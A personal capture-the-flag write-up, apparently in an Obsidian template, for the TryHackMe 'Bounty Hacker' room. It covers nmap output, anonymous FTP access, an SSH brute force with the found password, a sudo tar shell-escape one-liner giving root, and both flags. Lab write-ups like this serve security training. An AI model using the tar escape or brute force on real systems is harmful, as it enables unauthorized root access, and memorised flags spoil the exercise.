---
creation date: July 16th 2023
last modified date: July 16th 2023
aliases: []
tags: #🎌
---

Primary Categories: 
Secondary Categories:  
Links: 
Search Tag: #🎌  

# [[THM - Bounty Hacker]]  


# Resolution summary
- Text
- Text

## Improved skills
- skill 1
- skill 2

## Used tools
- [[nmap]]
- [[FTP]]

---

# Information Gathering
Scanned all TCP ports:
```bash
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Enumerated open TCP ports:
```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.13.0.100
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 80
- Webpage contained lore about the box but nothing else

## Port 21
- FTP server that allowed anonymous login.
	- Signing into it through that showed two text files
		- *locks.txt*
			- Possible password list
		- *task.txt*
			- More lore and contained a name of a possible *user: lin* 


---

# Exploitation
## Brute Force SSH
- Used the password list we found on the FTP server against the user lin and found the following
	- User: *lin*
	- Password: *RedDr4gonSynd1cat3*


---

# Lateral Movement to user
## Local Enumeration
- Located user.txt in the home of user *lin* via SSH

## Lateral Movement vector


---

# Privilege Escalation
## Local Enumeration
- `sudo -l` for user *lin* has access to run [[tar]]
	- GTFObins contained the following for how to escalate the user. 

## Privilege Escalation vector
```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

---

# Trophy & Loot

user.txt = *THM{CR1M3_SyNd1C4T3}*
root.txt = *THM{80UN7Y_h4cK3r}*

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: July 16th 2023 (08:55 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
